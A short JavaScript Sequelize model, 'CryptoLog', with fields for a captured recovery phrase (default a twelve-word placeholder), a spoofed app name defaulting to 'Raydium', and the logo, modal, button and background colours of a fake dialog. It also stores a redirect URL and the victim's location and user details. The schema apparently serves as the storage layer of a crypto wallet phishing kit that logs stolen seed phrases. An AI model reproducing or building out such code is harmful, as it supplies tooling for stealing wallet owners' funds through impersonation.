import { DataTypes } from 'sequelize';
import sequelize from '../sequelize.js';

const CryptoLogs = sequelize.define('CryptoLog', {
  specialPhrase: {
    type: DataTypes.STRING,
    defaultValue: "one two three four five six seven eight nine ten eleven twelve",
  },
  appName: {
    type: DataTypes.STRING,
    defaultValue: "Raydium",
  },
  appLogo: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  phrase: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  modalColor: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  redirectUrl: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  backgroundcolor: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  btnColor: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  location: {
    type: DataTypes.JSON, 
  },
  userInfo: {
    type: DataTypes.JSON, 
  },
  userId: {
    type: DataTypes.INTEGER,
    allowNull: false, 
  }
}, {
  timestamps: true,
});

export default CryptoLogs;
